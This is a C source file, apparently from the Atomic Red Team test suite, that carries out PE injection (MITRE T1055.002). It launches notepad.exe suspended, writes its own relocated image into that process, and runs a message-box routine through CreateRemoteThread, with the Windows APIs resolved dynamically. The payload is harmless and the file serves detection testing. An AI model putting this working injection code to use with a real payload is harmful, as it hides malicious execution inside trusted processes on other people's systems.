/* 
PE Injector for Atomic Red Team Process Injection: Portable Executable Injection (T1055.002).
As per MITRE documentation "PE injection is a method of executing arbitrary code in the address space of a separate live process."
Code injects a message box PE into a remote process (notepad.exe) and run with pCreateRemoteThread
All Win APIs called dynamically. 
Author: thomas-meng@outlook.com
Code reference: 
tributes to Mantvydas Baranauskas who implemented the prototype PE injection technique
ired.team:
https://www.ired.team/offensive-security/code-injection-process-injection/pe-injection-executing-pes-inside-remote-processes
*/

#include <stdio.h>
#include <windows.h>

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

// Define function pointers for dynamically loaded functions
typedef HANDLE(WINAPI *PFN_GETMODULEHANDLEA)(LPCSTR);
typedef DWORD(WINAPI *PFN_GETLASTERROR)();
typedef VOID(WINAPI *PFN_SLEEP)(DWORD);
typedef HANDLE(WINAPI *PFN_CREATEREMOTETHREAD)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef BOOL(WINAPI *PFN_GETNATIVESYSTEMINFO)(LPSYSTEM_INFO);
typedef LPVOID(WINAPI *PFN_VIRTUALALLOC)(LPVOID, SIZE_T, DWORD, DWORD);
typedef LPVOID(WINAPI *PFN_VIRTUALALLOCEX)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI *PFN_WRITEPROCESSMEMORY)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef BOOL(WINAPI *PFN_CREATEPROCESSA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef HANDLE(WINAPI *PFN_OPENPROCESS)(DWORD, BOOL, DWORD);
typedef int(WINAPI *PFN_MESSAGEBOXA)(HWND, LPCSTR, LPCSTR, UINT);

BOOL IsSystem64Bit() {
    HMODULE hKernel32 = LoadLibrary("kernel32.dll");
    if (!hKernel32) return FALSE;

    PFN_GETNATIVESYSTEMINFO pGetNativeSystemInfo = (PFN_GETNATIVESYSTEMINFO)GetProcAddress(hKernel32, "GetNativeSystemInfo");
    if (!pGetNativeSystemInfo) {
        FreeLibrary(hKernel32);
        return FALSE;
    }

    BOOL bIsWow64 = FALSE;
    SYSTEM_INFO si = {0};
    pGetNativeSystemInfo(&si);
    if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 || si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64) {
        bIsWow64 = TRUE;
    }

    FreeLibrary(hKernel32);
    return bIsWow64;
}


DWORD InjectionEntryPoint() {
    HMODULE hUser32 = LoadLibrary("user32.dll");
    if (!hUser32) return 0;

    PFN_MESSAGEBOXA pMessageBoxA = (PFN_MESSAGEBOXA)GetProcAddress(hUser32, "MessageBoxA");
    if (pMessageBoxA) {
        pMessageBoxA(NULL, "Atomic Red Team", "Warning", NULL);
    }
    FreeLibrary(hUser32);
    return 0;
}


int main()
{
    HMODULE hKernel32 = LoadLibrary("kernel32.dll");
    if (!hKernel32) {
        printf("Failed to load kernel32.dll.\n");
        return -1;
    }

    PFN_CREATEPROCESSA pCreateProcessA = (PFN_CREATEPROCESSA)GetProcAddress(hKernel32, "CreateProcessA");
    PFN_GETLASTERROR pGetLastError = (PFN_GETLASTERROR)GetProcAddress(hKernel32, "GetLastError");
    PFN_SLEEP pSleep = (PFN_SLEEP)GetProcAddress(hKernel32, "Sleep");
    PFN_GETMODULEHANDLEA pGetModuleHandleA = (PFN_GETMODULEHANDLEA)GetProcAddress(hKernel32, "GetModuleHandleA");
    PFN_VIRTUALALLOC pVirtualAlloc = (PFN_VIRTUALALLOC)GetProcAddress(hKernel32, "VirtualAlloc");
    PFN_VIRTUALALLOCEX pVirtualAllocEx = (PFN_VIRTUALALLOCEX)GetProcAddress(hKernel32, "VirtualAllocEx");
    PFN_OPENPROCESS pOpenProcess = (PFN_OPENPROCESS)GetProcAddress(hKernel32, "OpenProcess");
    PFN_WRITEPROCESSMEMORY pWriteProcessMemory = (PFN_WRITEPROCESSMEMORY)GetProcAddress(hKernel32, "WriteProcessMemory");
    PFN_CREATEREMOTETHREAD pCreateRemoteThread = (PFN_CREATEREMOTETHREAD)GetProcAddress(hKernel32, "CreateRemoteThread");

    if (!pCreateProcessA || !pGetLastError || !pSleep || !pGetModuleHandleA || !pVirtualAlloc || !pVirtualAllocEx || !pOpenProcess || !pWriteProcessMemory || !pCreateRemoteThread) {
        printf("Failed to get one or more function addresses.\n");
        FreeLibrary(hKernel32);
        return -1;
    }

    // Use relevant notepad based on sys arch. 
    char notepadPath[256];
    if (IsSystem64Bit()) {
        strcpy(notepadPath, "C:\\Windows\\System32\\notepad.exe");
    } else {
        strcpy(notepadPath, "C:\\Windows\\SysWOW64\\notepad.exe");
    }

    // Launch Notepad in suspended state
    PROCESS_INFORMATION pi;
    STARTUPINFOA si;
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    if (!pCreateProcessA(NULL, notepadPath, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        DWORD dwError = pGetLastError();
        printf("Failed to launch Notepad. Error: %d\n", dwError);
        return -1;
    }

    pSleep(2000);

    PVOID imageBase = pGetModuleHandleA(NULL);
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)imageBase + dosHeader->e_lfanew);

    PVOID localImage = pVirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_READWRITE);
    memcpy(localImage, imageBase, ntHeader->OptionalHeader.SizeOfImage);

    HANDLE targetProcess = pOpenProcess(MAXIMUM_ALLOWED, FALSE, pi.dwProcessId);
    PVOID targetImage = pVirtualAllocEx(targetProcess, NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    DWORD_PTR deltaImageBase = (DWORD_PTR)targetImage - (DWORD_PTR)imageBase;
    PIMAGE_BASE_RELOCATION relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)localImage + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
    DWORD totalSize = ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
    DWORD totalProcessed = 0;

	// Iterate the reloc table of the local image and modify all absolute addresses to work at the address returned by VirtualAllocEx.
    while (totalProcessed < totalSize) {
        DWORD blockSize = relocationTable->SizeOfBlock;
        DWORD entryCount = (blockSize - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(BASE_RELOCATION_ENTRY);
        PBASE_RELOCATION_ENTRY entries = (PBASE_RELOCATION_ENTRY)(relocationTable + 1);

        for (DWORD i = 0; i < entryCount; i++) {
            DWORD offset = entries[i].Offset;
            DWORD_PTR relocationTarget = (DWORD_PTR)localImage + relocationTable->VirtualAddress + offset;
            *(DWORD_PTR *)relocationTarget += deltaImageBase;
        }

        totalProcessed += blockSize;
        relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)relocationTable + blockSize);
    }

    if (!pWriteProcessMemory(targetProcess, targetImage, localImage, ntHeader->OptionalHeader.SizeOfImage, NULL)) {
        DWORD dwError = pGetLastError();
        printf("Failed to write to target process memory. Error: %d\n", dwError);
        CloseHandle(targetProcess);
        return -1;
    }

	// Calculate the remote address of the function to be executed in the remote process by subtracting 
	// the address of the function in the current process by the base address of the current process, 
    // then adding it to the address of the allocated memory in the target process.
    // create a new thread with the start address set to the remote address of the function, using CreateRemoteThread.
    DWORD threadId;
    HANDLE hThread = pCreateRemoteThread(targetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)((DWORD_PTR)InjectionEntryPoint - (DWORD_PTR)imageBase + (DWORD_PTR)targetImage), NULL, 0, &threadId);
    if (!hThread) {
        DWORD dwError = pGetLastError();
        printf("Failed to create remote thread. Error: %d\n", dwError);
        CloseHandle(targetProcess);
        return -1;
    }

    CloseHandle(hThread);
    CloseHandle(targetProcess);

    FreeLibrary(hKernel32);
    return 0;
}
